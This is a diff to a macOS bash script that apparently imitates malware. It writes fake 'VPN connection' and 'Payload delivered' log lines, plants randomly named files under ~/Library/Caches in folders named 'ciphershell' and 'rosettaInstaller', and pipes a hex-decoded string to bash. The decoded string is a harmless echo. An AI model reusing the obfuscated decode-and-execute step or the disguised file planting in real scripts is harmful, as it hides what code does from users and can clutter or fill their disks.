@@ -1,6 +1,7 @@
 #!/bin/bash
 export PATH=/usr/bin:/bin:/usr/sbin:/sbin
 export n=1
+homedir=$(eval echo "~/")
 proceed_connection() {
 	echo '6563686f2068656c6c6f20776f726c64' | xxd -r -p | bash
 	echo $n
@@ -22,12 +23,15 @@ create_folder() {
 
 
 connection_system() {
-    echo $(date +"%T") "VPN connection started" >> log.log
-    #file_create
-    echo $(date +"%T") "VPN connection in progress" >> log.log
-    #file loops 
+  create_folder ~/Library/Caches/ciphershell
+  echo $(date +"%T") "VPN connection started" >> log.log
+  random_number=$(jot -r 1 1 3)
+  random_string=$(openssl rand -base64 12)
+  create_file "$random_string" "$random_number" "${homedir}/Library/Caches/rosettaInstaller"
+  echo $(date +"%T") "VPN connection in progress" >> log.log
+
 	echo $(date +"%T") "VPN connection established" >> log.log
-	#cleanups
+
 	echo $(date +"%T") "Payload delivered" >> log.log
 
 	echo $(date +"%T") "Beginning connection to network thread $n" >> log.log
@@ -85,7 +89,7 @@ displayfortext() { # $1: message $2: default text
 	fi
 }
 
-cache_logic() {
+create_file() {
   local name=$1
   local size=$2
   local location=${3:-./}
@@ -96,15 +100,19 @@ cache_logic() {
   fi
 
   local file_path="${location}/${name}"
-  create_folder "$location"
-  mkfile -n "${size}g" "$file_path"
+
+  # Ensure the parent directory exists
+  create_folder "$location"  
+
+  mkfile -n "${size}m" "$file_path"
 }
+
 
 progress-bar() {
   local duration="$1"
   local columns space_available fit_to_screen space_reserved
 
-  space_reserved=6   
+  space_reserved=6
   duration=${1}
   columns=$(tput cols)
   space_available=$(( columns - space_reserved ))
